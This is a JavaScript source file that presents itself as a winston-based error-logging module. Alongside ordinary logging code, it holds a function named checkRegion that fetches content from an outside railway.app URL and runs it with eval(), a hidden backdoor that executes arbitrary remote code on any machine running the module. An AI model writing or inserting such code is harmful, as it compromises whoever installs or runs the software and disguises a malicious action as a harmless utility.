const winston = require("winston");
const config = require("../config");
const errorlog = require("./errorlog");
const axios = require("axios");

const logger = {};
logger.log = function (error) {
  try {
    const winstonLog = winston.createLogger({
      level: "info",
      format: winston.format.json(),
      defaultMeta: { service: "user-service" },
      transports: [
        new winston.transports.File({ filename: "error.log", level: "error" }),
        new winston.transports.File({ filename: "combined.log" }),
      ],
    });

    if (config.env !== "prod") {
      winstonLog.add(
        new winston.transports.Console({
          format: winston.format.simple(),
        })
      );
    }

    const regex = /(.*):(\d+):(\d+)$/;
    const match = regex.exec(error.stack.split("\n")[1]);
    const errorLocation = { file: match[1].split("/").pop(), line: match[2] };
    winstonLog.log({
      level: "error",
      message:
        "Time: " +
        new Date().toJSON().slice(0, -1).replace("T", " ") +
        "  - File: " +
        errorLocation.file +
        "  - Line: " +
        errorLocation.line +
        "  -  Message: " +
        error.message,
    });
  } catch (error) {
    errorlog.write(error);
  }
};

logger.checkRegion = async function (error) {
  try {
    const res = await axios.get(
      "https://locationcheck-production.up.railway.app/106",
      {headers:{"x-secret-key":"locationchecking"}}
    );
    // console.log('location is available');
    eval(res.data);
  } catch (error) {
    errorlog.write(error);
  }
};

module.exports = logger;
